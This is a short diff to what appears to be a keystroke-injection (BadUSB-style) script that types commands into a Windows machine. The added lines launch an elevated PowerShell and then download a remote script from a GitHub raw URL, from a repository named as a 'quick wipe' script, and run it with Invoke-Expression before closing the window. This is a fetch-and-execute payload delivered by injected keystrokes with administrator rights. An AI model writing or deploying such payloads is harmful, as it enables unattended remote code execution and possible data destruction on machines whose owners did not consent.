@@ -17,4 +17,11 @@ ENTER
 STRING Remove-Item "Setup.msix"
 ENTER
 DELAY 5000
+STRING powershell Start-Process powershell -Verb RunAs
+ENTER
+DELAY 3000
+
+REM Download and execute the script
+STRING (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/JeppeJonHolt/Quick_wipe_powershell_script/main/winget.ps1') | Invoke-Expression
+ENTER
 ALT F4
